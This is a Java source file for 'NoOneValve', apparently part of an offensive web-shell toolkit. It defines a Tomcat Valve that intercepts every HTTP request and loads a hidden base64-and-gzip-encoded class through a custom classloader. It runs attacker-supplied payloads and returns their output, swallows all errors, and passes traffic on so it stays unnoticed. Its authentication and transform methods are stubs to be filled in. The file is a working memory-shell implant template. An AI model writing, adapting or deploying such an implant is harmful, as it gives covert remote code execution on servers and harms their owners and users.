package com.reajason.noone.core.shelltool;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/8/29
 */
public class NoOneValve extends ClassLoader implements Valve {

    private static Class<?> coreClass = null;
    private static String coreGzipBase64;

    public NoOneValve() {
    }

    public NoOneValve(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (isAuthed(request)) {
                try {
                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                    if (coreClass == null) {
                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
                        coreClass = new NoOneValve(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
                    }
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
                    httpChannelCore.equals(new Object[]{payload, outputStream});
                    httpChannelCore.toString();
                    ServletOutputStream responseOutputStream = response.getOutputStream();
                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                    responseOutputStream.write(data);
                    wrapResponse(response);
                    responseOutputStream.flush();
                    responseOutputStream.close();
                    return;
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        getNext().invoke(request, response);
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return null;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    Valve next;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }

    @Override
    public void backgroundProcess() {
    }
}
